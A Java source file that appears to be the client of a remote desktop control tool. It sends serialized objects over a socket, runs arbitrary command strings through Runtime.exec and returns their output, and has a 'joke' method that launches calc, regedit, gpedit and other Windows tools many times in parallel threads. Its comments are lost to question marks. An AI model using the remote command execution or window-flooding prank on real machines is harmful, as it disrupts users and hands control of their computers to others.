package com.controldesktop;

import javax.swing.*;
import java.io.*;
import java.net.Socket;

public class ClientFunction {
    public static void sendHeadMessage(Socket socket,HeadMessage hm){
        try {
            OutputStream os = socket.getOutputStream();
            BufferedOutputStream bos = new BufferedOutputStream(os);
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(hm);
            oos.flush();
        }catch (Exception e){
            JOptionPane.showMessageDialog(null,e.toString());
        }
    }

    public static String executeCommand(String cmd){
        Runtime runtime = Runtime.getRuntime();
        try{
            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(cmd).getInputStream(),"GB2312"));
            String line;
            StringBuilder builder = new StringBuilder();
            while ((line = br.readLine()) != null){
                builder.append(line).append("\n");
            }
            return builder.toString();
        }catch (Exception e){
            return e.toString();
        }
    }


    public static void showDialog(String message){
        class showDia extends Thread{
            String message;
            public showDia(String message){
                this.message = message;
            }
            @Override
            public void run() {
                JOptionPane.showMessageDialog(null,message);
            }
        }
        new showDia(message).start();
    }

    public static String escapeSymbol(String value){
        value = value.replaceAll("\\\\","\\\\\\\\");
        value = value.replaceAll("\"","\\\\\"");
        value = value.replaceAll("'", "\\\\'");
        value = value.replaceAll("%","\\%");
        value = value.replaceAll("_","\\_");
        value = value.replaceAll("\n","\\\\\\n");
        return value;
    }

    public static void jokeToClient(int Number){
        class joke extends Thread{
            String cmd;
            public joke(String cmd){
                this.cmd = cmd;
            }
            @Override
            public void run() {
                executeCommand(cmd);
            }
        }
        for (int i = 0 ; i < Number ; i++){
            new joke("explorer").start();//???????????????
            new joke("calc").start();//?????????
            new joke("devmgmt.msc").start();//???????????????
            new joke("gpedit").start();//?????????
            new joke("mspaint").start();//?????????
            new joke("osk").start();//????????????
            new joke("regedit.exe").start();//?????????
            new joke("winver").start();//????????????
            new joke("write").start();//?????????
            new joke("eudcedit").start();//????????????
            new joke("compmgmt.msc").start();//???????????????
            new joke("charmap").start();//???????????????
            new joke("control").start();//????????????
            new joke("mstsc").start();//??????????????????
            new joke("services.msc").start();//????????????
            new joke("mspaint").start();//????????????
        }
    }
    public static String[] getSystemInfo(){
        String osName = System.getProperty("os.name");//??????????????????
        return new String[0];
    }
}
